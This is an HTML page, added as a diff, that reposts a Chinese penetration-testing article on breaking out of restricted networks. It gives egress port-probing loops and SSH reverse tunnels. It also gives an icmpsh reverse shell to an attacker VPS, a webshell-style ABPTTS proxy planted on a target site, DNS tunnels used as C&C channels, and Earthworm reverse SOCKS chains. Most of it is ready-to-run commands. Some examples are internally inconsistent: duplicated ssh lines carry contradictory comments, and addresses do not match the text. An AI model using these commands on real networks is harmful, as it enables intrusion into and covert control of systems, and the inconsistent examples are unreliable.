@@ -1,0 +1,340 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  <title>判断什么端口能出来｜网络工程 / 代理与隧道｜BEN.OPS</title>
+  <meta name="description" content="判断什么端口能出来。本文属于网络工程 / 代理与隧道，服务器处于内网，可以访问外部网络。 服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。 服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。 对于以上三种情况，传统的方法可以突破1和2二种（全都可以理解为lcx），第3…">
+  <meta name="keywords" content="网络工程，代理与隧道，Linux，Windows，DNS，权限管理，知识笔记，网络工程 / 代理与隧道，判断什么端口能出来">
+  <meta name="author" content="BEN">
+  <meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large,max-video-preview:-1">
+  <meta name="googlebot" content="index,follow,max-snippet:-1,max-image-preview:large">
+  <meta name="baiduspider" content="index,follow">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <link rel="canonical" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-ebbad7d3f1f5.html">
+  <link rel="alternate" hreflang="zh-CN" href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-ebbad7d3f1f5.html">
+  <link rel="alternate" type="text/markdown" href="https://ben2023niao.github.io/ben-ops-notes/doc/md/202304141600-%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%2B%E4%BB%A3%E7%90%86%E4%B8%8E%E9%9A%A7%E9%81%93%2BLinux%2BWindows-%E5%88%A4%E6%96%AD%E4%BB%80%E4%B9%88%E7%AB%AF%E5%8F%A3%E8%83%BD%E5%87%BA%E6%9D%A5.md">
+  <link rel="alternate" type="application/rss+xml" title="BEN.OPS RSS" href="https://ben2023niao.github.io/ben-ops-notes/assets/rss.xml">
+  <link rel="alternate" type="application/xml" title="BEN.OPS Sitemap" href="https://ben2023niao.github.io/ben-ops-notes/assets/sitemap.xml">
+  <link rel="author" href="https://t.me/Ben_Bird">
+  <meta property="og:type" content="article">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:site_name" content="BEN.OPS 工程笔记">
+  <meta property="og:title" content="判断什么端口能出来">
+  <meta property="og:description" content="判断什么端口能出来。本文属于网络工程 / 代理与隧道，服务器处于内网，可以访问外部网络。 服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。 服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。 对于以上三种情况，传统的方法可以突破1和2二种（全都可以理解为lcx），第3…">
+  <meta property="og:url" content="https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-ebbad7d3f1f5.html">
+  <meta property="article:published_time" content="2023-04-14T16:00:00">
+  <meta property="article:modified_time" content="2023-04-14 16:00">
+  <meta property="article:section" content="网络工程 / 代理与隧道">
+  <meta property="article:author" content="https://t.me/Ben_Bird">
+  <meta property="og:image" content="https://ben2023niao.github.io/ben-ops-notes/doc/media/06aec11456ed3ab0be.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="判断什么端口能出来">
+  <meta name="twitter:description" content="判断什么端口能出来。本文属于网络工程 / 代理与隧道，服务器处于内网，可以访问外部网络。 服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。 服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。 对于以上三种情况，传统的方法可以突破1和2二种（全都可以理解为lcx），第3…">
+  <meta name="twitter:image" content="https://ben2023niao.github.io/ben-ops-notes/doc/media/06aec11456ed3ab0be.png">
+  <style>:root{color-scheme:light dark;--bg:#f4f0e8;--panel:#fffdf8;--bg2:#e8e1d6;--fg:#202621;--muted:#66736b;
+--line:#d4cbbd;--accent:#176b55;--accent2:#0b6094;--code:#17211d;--codefg:#d8f0e4;--warn:#9b5c12;
+--max:1120px}@media(prefers-color-scheme:dark){:root{--bg:#111713;--panel:#18201b;--bg2:#202b24;
+--fg:#dce9df;--muted:#9aad9f;--line:#314238;--accent:#67d4ad;--accent2:#76b9df;--code:#0a100d;
+--codefg:#cceadd;--warn:#f0b35c}}*{box-sizing:border-box}html{scroll-behavior:smooth;background:var(--bg)}
+body{margin:0;background:radial-gradient(circle at 15% 0,color-mix(in srgb,var(--accent) 8%,transparent),transparent 32rem),var(--bg);
+color:var(--fg);font:16px/1.82 ui-sans-serif,-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif}
+a{color:var(--accent);text-underline-offset:.22em}a:hover{color:var(--accent2)}.shell{width:min(var(--max),calc(100% - 32px));margin:auto}
+.topbar{position:sticky;top:0;z-index:5;border-bottom:1px solid var(--line);background:color-mix(in srgb,var(--bg) 88%,transparent);
+backdrop-filter:blur(14px)}.topbar .shell{min-height:62px;display:flex;align-items:center;gap:18px}.brand{font:700 1rem/1 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--fg);text-decoration:none;letter-spacing:.04em}.brand b{color:var(--accent)}.topbar nav{margin-left:auto;display:flex;gap:16px;flex-wrap:wrap;font-size:.9rem}
+main{padding:34px 0 64px}.crumbs{font-size:.84rem;color:var(--muted);margin-bottom:18px}.hero{border:1px solid var(--line);background:var(--panel);
+border-radius:16px;padding:clamp(20px,4vw,42px);box-shadow:0 16px 50px #0000000a}.eyebrow{font:700 .74rem/1.2 ui-monospace,SFMono-Regular,Menlo,monospace;
+color:var(--accent);letter-spacing:.12em;text-transform:uppercase}.hero h1{font-size:clamp(1.8rem,4.4vw,3.2rem);line-height:1.2;margin:.55rem 0 1rem;
+letter-spacing:-.025em;overflow-wrap:anywhere}.lede{font-size:1.04rem;color:var(--muted);max-width:75ch;margin:0 0 18px}.meta{display:flex;flex-wrap:wrap;gap:8px}
+.badge{display:inline-flex;align-items:center;border:1px solid var(--line);border-radius:999px;padding:.22rem .68rem;background:var(--bg2);
+font-size:.78rem;color:var(--fg);text-decoration:none}.layout{margin-top:24px;display:grid;grid-template-columns:minmax(0,1fr) 260px;gap:24px;align-items:start}
+.article,.aside-box,.seo-summary{border:1px solid var(--line);background:var(--panel);border-radius:14px}.article{padding:clamp(20px,4vw,48px);min-width:0}
+.article h1,.article h2,.article h3,.article h4{line-height:1.35;letter-spacing:-.012em;scroll-margin-top:80px}.article h2{margin-top:2.2em;padding-top:.6em;
+border-top:1px solid var(--line)}.article h1{display:none}.article img{display:block;max-width:100%;height:auto;margin:1.4rem auto;border-radius:8px}
+.article pre{overflow:auto;background:var(--code);color:var(--codefg);padding:16px;border-radius:9px;line-height:1.6}
+.article code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:.9em}.article :not(pre)>code{background:var(--bg2);padding:.12em .34em;border-radius:4px}
+.article table{display:block;max-width:100%;overflow:auto;border-collapse:collapse}.article th,.article td{border:1px solid var(--line);padding:.45rem .65rem}
+.article blockquote{margin:1.4rem 0;padding:.4rem 1rem;border-left:4px solid var(--accent);background:var(--bg2);color:var(--muted)}
+.article hr{border:0;border-top:1px solid var(--line);margin:2rem 0}.aside{position:sticky;top:82px;display:grid;gap:14px}
+.aside-box{padding:16px}.aside-box h2{font-size:.83rem;margin:0 0 12px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted)}
+.aside-box ol,.aside-box ul{margin:0;padding-left:1.15rem}.aside-box li{margin:.5rem 0;font-size:.9rem}.aside-box a{text-decoration:none}
+.seo-summary{margin-top:24px;padding:20px 24px}.seo-summary h2{font-size:1rem;margin:0 0 .65rem}.seo-summary p{margin:0;color:var(--muted)}
+.pager{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:24px}.pager a{border:1px solid var(--line);border-radius:12px;
+padding:14px 16px;background:var(--panel);text-decoration:none}.pager a:last-child{text-align:right}.pager small{display:block;color:var(--muted)}
+footer{padding:28px 0 48px;border-top:1px solid var(--line);color:var(--muted);font-size:.88rem}footer .shell{display:flex;gap:16px;flex-wrap:wrap}
+.index-hero h1{font-size:clamp(2.1rem,6vw,4.4rem)}.stat-grid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px;margin-top:20px}
+.stat{border:1px solid var(--line);background:var(--bg2);border-radius:10px;padding:12px}.stat strong{display:block;font:700 1.35rem/1.2 ui-monospace,monospace}
+.stat span{font-size:.78rem;color:var(--muted)}.year{margin-top:34px}.year>h2{position:sticky;top:62px;z-index:2;margin:0;padding:12px 0;
+background:color-mix(in srgb,var(--bg) 92%,transparent);backdrop-filter:blur(8px);font:700 1.25rem/1.2 ui-monospace,monospace}
+.cards{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px}.card{border:1px solid var(--line);background:var(--panel);border-radius:12px;padding:18px}
+.card h3{font-size:1.02rem;line-height:1.45;margin:.35rem 0 .55rem}.card h3 a{text-decoration:none}.card p{margin:.45rem 0;color:var(--muted);font-size:.87rem}
+.card .date{font:600 .77rem/1 ui-monospace,monospace;color:var(--accent)}.tags{display:flex;flex-wrap:wrap;gap:5px}.tag{font-size:.72rem;color:var(--muted);border:1px solid var(--line);
+border-radius:99px;padding:.12rem .48rem}@media(max-width:860px){.layout{grid-template-columns:1fr}.aside{position:static;grid-row:1}.cards{grid-template-columns:1fr}}
+@media(max-width:620px){body{font-size:15px}.shell{width:min(100% - 22px,var(--max))}.topbar nav{gap:10px;font-size:.8rem}.hero,.article{padding:18px}
+.meta{gap:6px}.stat-grid{grid-template-columns:repeat(2,1fr)}.pager{grid-template-columns:1fr}.pager a:last-child{text-align:left}}
+@media print{.topbar,.aside,.pager,footer{display:none}.shell{width:100%}.article,.hero{border:0;box-shadow:none;padding:0}}</style>
+  <script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","@id":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-ebbad7d3f1f5.html#article","headline":"判断什么端口能出来","description":"判断什么端口能出来。本文属于网络工程 / 代理与隧道，服务器处于内网，可以访问外部网络。 服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。 服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。 对于以上三种情况，传统的方法可以突破1和2二种（全都可以理解为lcx），第3…","datePublished":"2023-04-14T16:00:00","dateModified":"2023-04-14 16:00","inLanguage":"zh-CN","articleSection":["网络工程","代理与隧道"],"keywords":["网络工程","代理与隧道","Linux","Windows","DNS","权限管理","知识笔记","网络工程 / 代理与隧道","判断什么端口能出来"],"wordCount":3209,"mainEntityOfPage":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-ebbad7d3f1f5.html","url":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-ebbad7d3f1f5.html","author":{"@type":"Person","name":"BEN","url":"https://t.me/Ben_Bird"},"publisher":{"@type":"Organization","name":"BEN.OPS 工程笔记","url":"https://ben2023niao.github.io/ben-ops-notes/"},"image":["https://ben2023niao.github.io/ben-ops-notes/doc/media/06aec11456ed3ab0be.png"]},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"BEN.OPS 工程笔记","item":"https://ben2023niao.github.io/ben-ops-notes/"},{"@type":"ListItem","position":2,"name":"网络工程 / 代理与隧道","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html"},{"@type":"ListItem","position":3,"name":"判断什么端口能出来","item":"https://ben2023niao.github.io/ben-ops-notes/assets/seo/doc-ebbad7d3f1f5.html"}]}]}</script>
+</head>
+<body>
+  <header class="topbar"><div class="shell">
+    <a class="brand" href="https://ben2023niao.github.io/ben-ops-notes/"><b>$_</b> BEN.OPS</a>
+    <nav aria-label="站点导航">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">交互知识库</a>
+      <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">静态文章索引</a>
+      <a href="https://t.me/Ben_Bird">@Ben_Bird</a>
+    </nav>
+  </div></header>
+  <main class="shell">
+    <nav class="crumbs" aria-label="面包屑">
+      <a href="https://ben2023niao.github.io/ben-ops-notes/">首页</a> › <a href="https://ben2023niao.github.io/ben-ops-notes/assets/seo/index.html">工程笔记</a>
+      › <span>网络工程 / 代理与隧道</span> › <span>判断什么端口能出来</span>
+    </nav>
+    <header class="hero">
+      <div class="eyebrow">网络工程 / 代理与隧道</div>
+      <h1>判断什么端口能出来</h1>
+      <p class="lede">判断什么端口能出来。本文属于网络工程 / 代理与隧道，服务器处于内网，可以访问外部网络。 服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。 服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。 对于以上三种情况，传统的方法可以突破1和2二种（全都可以理解为lcx），第3…</p>
+      <div class="meta">
+        <time class="badge" datetime="2023-04-14T16:00:00">发布于 2023-04-14</time>
+        <span class="badge">作者 BEN</span>
+        <span class="badge">3,209 字</span>
+        <span class="badge">10 分钟阅读</span>
+      </div>
+    </header>
+    <div class="layout">
+      <article class="article" itemscope itemtype="https://schema.org/TechArticle">
+        
+<p>原文 by <a href="http://rcoil.me/2017/06/渗透测试-之-代理篇/" rel="noopener noreferrer">RcoIl的窝</a></p>
+<p>服务器处于内网，可以访问外部网络。
+服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。
+服务器处于内网，对外只开放了80端口，并且服务器不能访问外网网络。
+对于以上三种情况，传统的方法可以突破1和2二种（全都可以理解为lcx），第3种可以使用SOCKS代理。
+代理小技巧</p>
+<h2 id="判断什么端口能出来">判断什么端口能出来</h2>
+<h3 id="VISTA-以下">VISTA 以下</h3>
+<ul>
+<li>
+<p>TCP
+<code>FOR /L %i IN (1,1,65535) DO (cmd /c "start /b telnet 203.0.113.1 %i")</code>
+用 TELNET 不停的连接你的 1-65535 端口, 你本地开个 TCPDUMP 就行了, 如果连通了, 就 OK 。</p>
+</li>
+<li>
+<p>UDP
+<code>FOR /L %i IN (1,1,65535) DO (cmd /c "start /b nslookup -port=%i rcoil.me 203.0.113.1")</code>
+这个速度慢，但是有效。</p>
+</li>
+</ul>
+<h3 id="VISTA-以后">VISTA 以后</h3>
+<ul>
+<li>TCP</li>
+</ul>
+<pre><code>function sT($IP,$Port) {$Address = [system.net.IPAddress]::Parse($IP);$End = New-Object System.Net.IPEndPoint $address, $port;$Saddrf = [System.Net.Sockets.AddressFamily]::InterNetwork;$Stype = [System.Net.Sockets.SocketType]::Stream;$Ptype = [System.Net.Sockets.ProtocolType]::TCP;$Sock = New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype;$Sock.TTL = 26;try { $sock.Connect($End);[Byte[]] $Message = [char[]]"w00tw00t";$Sent = $Sock.Send($Message);$sock.EndConnect($Connect)} catch {};$Sock.Close();};1..65535 | %{ sT -IP "203.0.113.1" -Port $_ }
+</code></pre>
+<ul>
+<li>UDP</li>
+</ul>
+<pre><code>function sU($IP, [int]$Port){$Address = [system.net.IPAddress]::Parse($IP);$End = New-Object System.Net.IPEndPoint($Address, $port);$Saddrf=[System.Net.Sockets.AddressFamily]::InterNetwork;$Stype=[System.Net.Sockets.SocketType]::Dgram;$Ptype=[System.Net.Sockets.ProtocolType]::UDP;$Sock=New-Object System.Net.Sockets.Socket $saddrf, $stype, $ptype;$Sock.TTL = 26;$sock.Connect($end);$Enc=[System.Text.Encoding]::ASCII;$Message = "w00tw00t";$Buffer=$Enc.GetBytes($Message);$Sent=$Sock.Send($Buffer);}; 1..65535 | %{ sU -IP "203.0.113.1" -Port $_ }
+</code></pre>
+<h2 id="SSH隧道">SSH隧道</h2>
+<p>编辑/etc/ssh/sshd_config文件（服务器端）中：</p>
+<pre><code>GatewayPorts yes
+PermitRootLogin yes
+PermitTunnel yes #Tunnel启用
+ClientAliveInterval 60 #指定了服务器端向客户端请求消息的时间间隔,
+ClientAliveCountMax 3 #请求后客户端没有响应的次数达到3次, 就自动断开
+</code></pre>
+<p>接着重启ssh服务</p>
+<p>参数详解：
+-q Quiet mode. 安静模式
+-T Disable pseudo-tty allocation. 不占用 shell 了
+-N：Do not execute a remote command. 不执行远程命令，端口转发就用它了。
+-C：该参数将使ssh压缩所有通过Secure Shell客户端发送的数据，包括输入、输出、错误消息及转发数据。它使用gzip算法，压缩级别可通过设置配制文件中的参数Compressicn Level来指定。这对于缓慢的传输线路特别有用的。但对于传输速度已经很快的网络则显得没有必要。同样，你可以利用配制文件针对每台主机配置这个参数。
+-f：该参数将ssh连接送入后台执行。这在验证已经完成且TCP/IP转发已经建立的情况下会生效。这对在远程主机上启动X程序显得十分重要。其后用户将被提示要求输入口令(提供的认证代理不运行)，然后将连接送往后台。并推荐加上 -n 参数
+-g：该参数允许远程主机通过端口转发与主机端口相连，通常情况下仅允许本地主机这样做。
+-R：远程转发
+-L：本地转发
+-D：...</p>
+<h3 id="端口转发">端口转发</h3>
+<pre><code>ssh -qTfnN -L hostport:host:port -l user remote_ip #正向隧道
+ssh -qTfnN -R port:host:hostport -l user remote_ip #反向隧道
+</code></pre>
+<p>举个例子</p>
+<pre><code>ssh -N -R 5555:203.0.113.1:5556 username@host  # 5555是本地端口，本地访问5555就是访问vps的5556。
+ssh -N -R 5555:203.0.113.1:5556 username@host  # 5555是vps的端口，访问vps的5555就是访问本地的5556。
+</code></pre>
+<h3 id="正向代理">正向代理</h3>
+<pre><code>SSH -qTfnN -D port remotehost #直接进行socks代理
+ssh -qTfnN -D 6080 user@theserver #在本地终端中运行
+</code></pre>
+<p>然后在浏览器或者软件中设置好代理参数
+socks5: 203.0.113.1:6080 后便可以使用.
+-q：静默运行</p>
+<h3 id="远程转发-反向">远程转发(反向)</h3>
+<p>第一步：
+sudo python -m SimpleHTTPServer 80
+在目标机子开启80端口服务
+第二步：
+<code>ssh -p 22 -qngfNTR 6666:localhost:22 VPS-user@VPS</code>
+这样就把目标本地的22端口转发到了远程机器（VPS）的6666端口
+第三步：
+个人PC机器直接使用语句:
+<code>ssh -p 6666 -qngfNTD 6767 内网用户@VPS</code>
+这样就可以直接穿透网络，进入到内网，本地机器直接使用SOCKS5代理127.0.0.1:6767便能够直接访问到目标内网当中</p>
+<h2 id="ICMP隧道">ICMP隧道</h2>
+<p>ICMP隧道是通过将任意数据注入发送到远程计算机的回送数据包来工作的。要判断是否能使用ICMP隧道，我们只需要关注一件事情：可以ping一个外部服务器。如果能到达外部网络，，那么很有可能可以建立一个icmp隧道。缺点是需要root/administrator权限。</p>
+<h3 id="icmpsh">icmpsh</h3>
+<p>vps上：</p>
+<pre><code>git clone https://github.com/inquisb/icmpsh.git
+apt-get install python-impacket
+sysctl -w net.ipv4.icmp_echo_ignore_all=1
+python icmpsh_m.py 39.xxx.xxx.17 182.xxx.xxx.207
+</code></pre>
+<p>靶机上：</p>
+<p><code>icmpsh.exe -t 39.xxx.xxx.17 -d 500 -b 30 -s 128</code>
+就会在vps上接到一个cmdshell。</p>
+<h2 id="HTTP代理">HTTP代理</h2>
+<h3 id="abptts">abptts</h3>
+<p><a href="https://github.com/nccgroup/ABPTTS" rel="noopener noreferrer">项目地址</a>
+首先,安装好工具所需的各种py依赖库:</p>
+<pre><code>pip install pycrypto    加密库,整个数据加密都要靠这个
+pip install httplib2
+</code></pre>
+<p>生成好服务端(webshell)，-o用来指定要生成到的目录，然后把生成好的对应类型的代理脚本扔到目标网站目录中，并尝试访问该脚本，如果返回了一段类似hash的数据,说明代理端执行正常,继续进行后面的步骤即可，如下:</p>
+<pre><code>python abpttsfactory.py -o webshell
+abppts_webshell
+abppts_webshell_request
+</code></pre>
+<p><img alt="判断什么端口能出来" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/06aec11456ed3ab0be.png"/>
+<img alt="判断什么端口能出来" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/eed70f30e49ba7e3ea.png"/>
+前面确认没有问题后,现在开始绑定端口，建立隧道，下面的意思就是把远端[目标机器]的3389端口和本地的1234端口进行绑定，-c用来指定webshell的配置文件[这里直接用默认的]，-u 指定webshell的url，关于更多选项用法，看下工具帮助就明白了，都非常简单的:</p>
+<p><code>python abpttsclient.py -c webshell\config.txt -u "http://www.rcoil.com/abptts.aspx" -f 203.0.113.1:1234/203.0.113.1:3389</code>
+隧道建立成功后，用相应的socks代理客户端工具[proxychains,sockscap……]连接到前面已经绑定好的本地端口[1234端口]，即可访问目标内网中的资源:</p>
+<pre><code>mstsc 203.0.113.1:1234
+putty ssh root@203.0.113.1 -p 1234 -i ~/.ssh/xxx/id_rsa     如果对方的ssh只允许证书登录,加载上自己的证书即可
+</code></pre>
+<h2 id="DNS隧道">DNS隧道</h2>
+<p>不论对出站流量采取多么严格的访问控制，你可能都要允许至少对一个服务器的 DNS 请求。对手就可以利用这个防火墙上的“大洞”来偷运数据，并且建立一个非常难以限制的隐蔽命令控制信道。</p>
+<h3 id="Iodine">Iodine</h3>
+<p>它几乎是和hans icmp隧道工具一样的工作机制，它在它们之间创建一对tun适配器和隧道数据作为DNS查询。<a href="http://dev.kryo.se/iodine/wiki/HowtoSetup" rel="noopener noreferrer">使用手册</a>
+Server端：</p>
+<p><code>iodined -f -c -P password 203.0.113.1 tunneldomain.com</code>
+Client端：</p>
+<p><code>iodine -f -P password tunneldomain.com -r</code>
+成功连接将直接在客户端生成地址1.1.1.2。请注意，这种隧道技术的速度相当慢。最好的办法是在生成的连接上使用ssh连接：</p>
+<p><code>ssh &lt;user&gt;@203.0.113.1 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080</code></p>
+<h3 id="Dnscat2">Dnscat2</h3>
+<p><a href="https://github.com/iagox86/dnscat2" rel="noopener noreferrer">Dnscat2</a> 通过建立C&amp;C通道递归DNS查询。此工具不需要root/administrator权限（在Windows和Linux上都可以使用），它还支持端口转发。
+Server端：</p>
+<p><code>ruby ./dnscat2.rb tunneldomain.com</code>
+Client端：</p>
+<p><code>./dnscat2 tunneldomain.com</code>
+收到Server端的连接后，可以使用windows命令查看活动会话：</p>
+<pre><code>dnscat2&gt; windows
+0 :: main [active]
+  dns1 :: DNS Driver running on 203.0.113.1:53 domains = tunneldomain.com [*]
+  1 :: command session (debian)
+  2 :: sh (debian) [*]
+</code></pre>
+<p>要启动端口转发，请选择一个命令会话session -i ：</p>
+<pre><code>dnscat2&gt; session -i 1
+New window created: 1
+New window created: 1
+history_size (session) =&gt; 1000
+This is a command session!
+That means you can enter a dnscat2 command such as
+'ping'! For a full list of clients, try 'help'.
+command session (debian) 1&gt;
+</code></pre>
+<p>使用listen [lhost:]lport rhost:rport命令转发端口：</p>
+<p><code>command session (debian) 1&gt; listen 203.0.113.1:8080 203.0.113.1:80</code>
+这将绑定靶机上的端口8080，并将所有连接转发到10.0.0.20:80。</p>
+<h2 id="TCP隧道">TCP隧道</h2>
+<h3 id="shootback">shootback</h3>
+<p><a href="https://github.com/aploium/shootback" rel="noopener noreferrer">shootback</a>，是由python开发的反向TCP隧道，使得NAT或防火墙后的内网机器可以被外网访问。在800并发下消耗小于1％的CPU和8MB内存。
+….</p>
+<h2 id="SOCKS">SOCKS</h2>
+<p>在实际渗透测试过程中，当我们成功的拿下第一台靶机后，此时我们又想对目标内网进一步渗透测试时，socks能够帮助我们更加快速的，方便的访问目标内网的各种资源，比传统的端口转发更加实用。</p>
+<h3 id="socks代理工具">socks代理工具</h3>
+<p>socks代理其实也可理解为一个增强版的 lcx，它在服务端监听一个服务端口，当有新的连接请求时会从socks协议中解析出访问目标的URL的目标端口，再开始执行lcx的具体功能。</p>
+<p>网络上Socks代理工具有很多，选用的时候尽可能使用无GUI界面的工具，还有尽可能不需要安装其他依赖软件，能够支持多平台操作系统的更佳。</p>
+<h3 id="Earthworm">Earthworm</h3>
+<p>工具网址：http://rootkiter.com/EarthWorm
+EW 是一套便携式的网络穿透工具，具有 SOCKS v5服务架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。该工具能够以正向、反向、多级级联等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。
+工具包中提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内,强烈推荐使用。</p>
+<p>目前已经有了最新版Termite，工具网址：http://rootkiter.com/Termite/</p>
+<p>官方提供的方法就已经很好了，配套的Termite更不错，Termite中，只要节点互通，就可以任意切换代理。</p>
+<h3 id="正向-SOCKS-v5-服务器">正向 SOCKS v5 服务器</h3>
+<p>在具有公网IP时：</p>
+<p><code>./ew -s ssocksd -l 1080</code></p>
+<h3 id="反弹-SOCKS-v5-服务器">反弹 SOCKS v5 服务器</h3>
+<p>先在一台具有公网 ip :233.233.233.233的主机A上运行以下命令：</p>
+<p><code>./ew -s rcsocks -l 1080 -e 8888</code>
+在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口</p>
+<p><code>./ew -s rssocks -d 203.0.113.1 -e 8888</code>
+HackTools 可通过访问=203.0.113.1:1080端口使用 rssocks 主机提供的 socks5 代理服务</p>
+<h3 id="二级级联">二级级联</h3>
+<p>环境示意图：
+<img alt="判断什么端口能出来" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/ffe14a0b95fb6f2c40.png"/></p>
+<p>环境说明（一）：V1主机配有2块网卡，一块连通外网，一块10.255.11.8只能连接内网V2主机，无法访问内网其它资源。V2主机可以访问内网资源，但无法访问外网。</p>
+<pre><code># V2执行，利用ssocksd方式启动8888端口的socks代理
+./ew -s ssocksd -l 8888
+# V1执行，将来自外部的1080端口的代理请求转发到V2的8888端口上
+./ew -s lcx_tran -l 1080 -f 203.0.113.1 -g 8888
+# Attack执行，使用Proxifier等建立正常的socks代理访问1080端口
+</code></pre>
+<p>环境说明（二）：V1主机没有公网IP，也无法访问内网资源。V2主机可以访问内网资源，但无法访问外网。</p>
+<pre><code># VPS执行，把来自外部的1080端口的流量转到本地的8888端口上
+./ew –s lcx_listen –l 1080 –e 8888
+# V2执行，在本地启动socks5代理并监听9999端口
+./ew -s ssocksd -l 9999
+# V1执行，把vps的8888端口和V2的9999进行绑定,即建立socks5通道
+./ew -s lcx_slave -d 203.0.113.1 -e 8888 -f 203.0.113.1 -g 9999
+# Attack执行，使用Proxifier等建立正常的socks代理访问1080端口
+</code></pre>
+<h3 id="三级级联">三级级联</h3>
+<p>再提供一个“三级级联”的本地SOCKS测试用例以供参考
+环境示意图：
+<img alt="判断什么端口能出来" decoding="async" loading="lazy" src="https://ben2023niao.github.io/ben-ops-notes/doc/media/ea92252a62795304cf.png"/></p>
+<p>环境说明：Web server没有公网IP但可以访问外网，V2主机不能访问外网但可以被Web server主机访问，V3主机可被V2主机访问且能访问核心区域</p>
+<pre><code># vps上执行，把来自外部的1080端口流量转到本地的8888端口上
+./ew -s rcsocks -l 1080 -e 8888
+# Web server执行，把vps的8888端口和内网V2的9999端口绑定
+./ew -s lcx_slave -d 203.0.113.1 -e 8888 -f 203.0.113.1 -g 9999
+# V2执行，将来自外部的7777端口和本地的9999端口进行绑定
+./ew -s lcx_listen -l 9999 -e 7777
+# V3执行，将本地的socks连接反弹到V2的7777端口上
+./ew -s rssocks -d 203.0.113.1 -e 7777
+# Attack执行，使用Proxifier等建立正常的socks代理访问1080端口
+</code></pre>
+<p>数据流向: Attack(SOCKS v5) -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</p>
+      </article>
+      <aside class="aside">
+        <aside class="aside-box"><h2>本页目录</h2><ol><li style="margin-left:0.0rem"><a href="#判断什么端口能出来">判断什么端口能出来</a></li><li style="margin-left:0.8rem"><a href="#VISTA-以下">VISTA 以下</a></li><li style="margin-left:0.8rem"><a href="#VISTA-以后">VISTA 以后</a></li><li style="margin-left:0.0rem"><a href="#SSH隧道">SSH隧道</a></li><li style="margin-left:0.8rem"><a href="#端口转发">端口转发</a></li><li style="margin-left:0.8rem"><a href="#正向代理">正向代理</a></li><li style="margin-left:0.8rem"><a href="#远程转发-反向">远程转发(反向)</a></li><li style="margin-left:0.0rem"><a href="#ICMP隧道">ICMP隧道</a></li><li style="margin-left:0.8rem"><a href="#icmpsh">icmpsh</a></li><li style="margin-left:0.0rem"><a href="#HTTP代理">HTTP代理</a></li><li style="margin-left:0.8rem"><a href="#abptts">abptts</a></li><li style="margin-left:0.0rem"><a href="#DNS隧道">DNS隧道</a></li><li style="margin-left:0.8rem"><a href="#Iodine">Iodine</a></li><li style="margin-left:0.8rem"><a href="#Dnscat2">Dnscat2</a></li><li style="margin-left:0.0rem"><a href="#TCP隧道">TCP隧道</a></li><li style="margin-left:0.8rem"><a href="#shootback">shootback</a></li><li style="margin-left:0.0rem"><a href="#SOCKS">SOCKS</a></li><li style="margin-left:0.8rem"><a href="#socks代理工具">socks代理工具</a></li><li style="margin-left:0.8rem"><a href="#Earthworm">Earthworm</a></li><li style="margin-left:0.8rem"><a href="#正向-SOCKS-v5-服务器">正向 SOCKS v5 服务器</a></li><li style="margin-left:0.8rem"><a href="#反弹-SOCKS-v5-服务器">反弹 SOCKS v5 服务器</a></li><li style="margin-left:0.8rem"><a href="#二级级联">二级级联</a></li><li style="margin-left:0.8rem"><a href="#三级级联">三级级联</a></li></ol></aside>
+        <div class="aside-box"><h2>文章信息</h2><ul>
+          <li>分类：网络工程 / 代理与隧道</li>
+          <li>日期：2023-04-14</li>
+          <li>标签：<span class="tag">网络工程</span><span class="tag">代理与隧道</span><span class="tag">Linux</span><span class="tag">Windows</span><span class="tag">DNS</span><span class="tag">权限管理</span><span class="tag">知识笔记</span></li>
